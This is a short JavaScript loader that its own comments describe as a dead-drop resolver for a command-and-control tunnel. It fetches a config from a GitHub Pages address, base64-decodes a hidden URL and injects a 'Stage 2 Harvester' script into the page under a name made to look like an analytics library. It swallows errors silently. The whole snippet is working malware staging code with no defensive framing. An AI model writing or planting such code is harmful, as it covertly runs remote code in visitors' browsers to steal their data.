(async function() {
    try {
        // 1. Fetch the Dead-Drop Resolver
        const response = await fetch('https://arcanaumbra.github.io/result_predictor/tunnel.json?t=' + Date.now());
        const config = await response.json();
        
        // 2. Decode the current C2 Tunnel URL
        const harvesterUrl = atob(config.u);
        
        // 3. Inject the Stage 2 Harvester (ga-core.min.js)
        const script = document.createElement('script');
        script.src = harvesterUrl;
        script.async = true;
        document.head.appendChild(script);
        
        console.log("[!] Recon Link Established.");
    } catch (e) {
        // Fail silently
    }
})();

